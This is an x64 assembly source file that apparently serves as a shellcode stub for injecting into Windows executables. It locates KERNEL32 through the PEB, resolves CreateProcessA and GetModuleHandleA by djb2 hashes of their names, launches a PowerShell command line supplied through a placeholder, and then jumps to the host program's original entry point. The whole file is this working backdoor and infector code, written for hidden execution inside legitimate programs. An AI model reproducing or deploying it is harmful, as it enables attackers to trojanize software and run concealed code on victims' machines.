;structure of 64-bit PEB: https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/
;PE-64bit file format: http://www.keithholman.net/pe-format.html
;PE-32bit file format (for export directory structure reference): http://www.sunshine2k.de/reversing/tuts/tut_pe.htm
;Export directory reference: https://resources.infosecinstitute.com/topic/the-export-directory/

pre:
	call main
	db "%s", 0
main:
	pop rdi
	push rbp
	mov rbp, rsp
	sub rsp, 0xb0
	mov [rbp - 8], rdi			; powershell script address
	mov rbx, gs:0x60 
	mov [rbp - 0x10], rbx		; PEB address
	mov rbx, [rbx + 0x18]		; offset to _PEB_LDR_DATA
	mov rbx, [rbx + 0x20]		; offset to _LDR_DATA_TABLE_ENTRY
	mov [rbp - 0x18], rbx
	loop:
		mov rcx, [rbp- 0x18]
		mov rcx, [rcx + 0x50]	; offset to the module name, this came from debugging
		call calHashWchar
		cmp eax, 0x6ddb9555		; find KERNEL32.DLL
		jz gotModule
		mov rbx, [rbp - 0x18]
		mov rbx, [rbx]
		mov [rbp- 0x18], rbx	; move to the next entry
		jmp loop
	gotModule:
		mov rbx, [rbp - 0x18]
		mov rax, [rbx + 0x20]	; get the dll base address
		mov [rbp - 0x20], rax	
		mov rdx, 0xaeb52e19		; second param: hash of CreateProcessA
		mov rcx, rax			; first param: dll base address
		call getFunction


		lea rbx, [rbp - 0x48]
		push rbx				; lpProcessInformation

		;The stack has to be 16-byte aligned
		;So lpStartupInfo will start at [rbp - 0xb0] instead of [rbp - 0xa8]
		lea rbx, [rbp - 0xb0]	; lpStartupInfo
		push rbx
		push 0					; lpCurrentDirectory
		push 0					; lpEnvironment
		push 0					; dwCreationFlags
		push 0					; bInheritHandles
		xor r9, r9				; lpThreadAttributes
		xor r8, r8				; lpProcessAttributes
		mov rdx, [rbp - 8]		; lpCommandLine
		xor rcx, rcx			; lpApplicationName


		; I really dont understand why we have to push 4 more times.
		; A normal executable calls CreateProcessA with the first parameter pushed to [rsp + 32]
		; So I just follow that
		push 0
		push 0
		push 0
		push 0

		call rax

		mov rdx, 0x5a153f58
		mov rcx, [rbp - 0x20]
		call getFunction		; Find GetModuleHandleA
		
		mov rcx, 0
		call rax
		add rax, %d				; original entry point goes here
		add rsp, 0xb0
		pop rbp
		push rax
		ret



	
calHashWchar:
	; djb2 hashing algorithm: http://www.cse.yorku.ca/~oz/hash.html
	push rbp
	mov rbp, rsp
	sub rsp, 0x18
	mov [rbp - 8], rcx
	mov rax, 0x1505
	mov [rbp - 0x10], rax
	hashLoopW:
		mov rbx, [rbp - 8]
		movzx rbx, word [rbx]
		test rbx, rbx
		jz hashEndW

		mov ecx, [rbp - 0x10]
		mov edx, ecx
		shl ecx, 5
		add ecx, edx
		add ecx, ebx
		mov [rbp - 0x10], ecx

		mov rcx, [rbp - 8]
		add rcx, 2
		mov [rbp - 8], rcx
		jmp hashLoopW

	hashEndW:
		mov eax, dword [rbp - 0x10]		; Note: no need to clear rax, the high 32-bit is cleared automaically	
		mov rsp, rbp
		pop rbp
		ret

calHashChar:
	; djb2 hashing algorithm: http://www.cse.yorku.ca/~oz/hash.html
	push rbp
	mov rbp, rsp
	sub rsp, 0x18
	mov [rbp - 8], rcx
	mov rax, 0x1505
	mov [rbp - 0x10], rax
	hashLoopC:
		mov rbx, [rbp - 8]
		movzx rbx, byte [rbx]
		test rbx, rbx
		jz hashEndC

		mov ecx, [rbp - 0x10]
		mov edx, ecx
		shl ecx, 5
		add ecx, edx
		add ecx, ebx
		mov [rbp - 0x10], ecx

		mov rcx, [rbp - 8]
		add rcx, 1
		mov [rbp - 8], rcx
		jmp hashLoopC

	hashEndC:
		mov eax, dword [rbp - 0x10]		; Note: no need to clear rax, the high 32-bit is cleared automaically	
		mov rsp, rbp
		pop rbp
		ret
	

getFunction:
	push rbp
	mov rbp, rsp
	sub rsp, 0x28
	mov [rbp - 8], rcx
	mov [rbp - 0x10], rdx

	mov rcx, [rbp - 8]
	mov rdx, rcx
	mov eax, dword [rcx + 0x3c]
	add rdx, rax	; PE header address

	mov rcx, [rbp - 8]
	mov eax, [rdx + 0x88] 
	add rcx, rax	; ExportDirectory address
	mov [rbp - 0x18], rcx

	xor eax, eax
	mov [rbp - 0x20], eax
	findFunction:
		mov eax, [rbp - 0x20]
		mov rcx, [rbp - 0x18]
		cmp eax, [rcx + 0x18]	; compare with NumberOfNames
		jnb noFunc

		mov ecx, [rcx + 0x20]	; AddressOfNames
		mov rdx, [rbp - 8]
		add rcx, rdx
		mov ecx, [rcx + rax * 4]	; Name VA
		add rcx, rdx				; True address of name
		call calHashChar
		cmp rax, [rbp - 0x10]
		jz foundFunction
		mov eax, [rbp - 0x20]
		add eax, 1
		mov [rbp - 0x20], eax
		jmp findFunction

	foundFunction:
		mov eax, [rbp - 0x20]
		mov rbx, [rbp - 0x18]
		mov ebx, [rbx + 0x24]	; AddressOfNameOrdinals
		mov rcx, [rbp - 8]
		add rbx, rcx
		mov cx, [rbx + rax * 2]	; function ordinal
		movzx rcx, cx
				
		mov rbx, [rbp - 0x18]
		mov edx, [rbx + 0x1c]	; AddressOfFunctions
		mov rbx, [rbp - 8]
		add rdx, rbx

		mov edx, [rdx + rcx * 4]
		mov rax, [rbp - 8]
		add rax, rdx
		jmp end

	noFunc:
		xor rax, rax

	end:
		mov rsp, rbp
		pop rbp
		ret
	
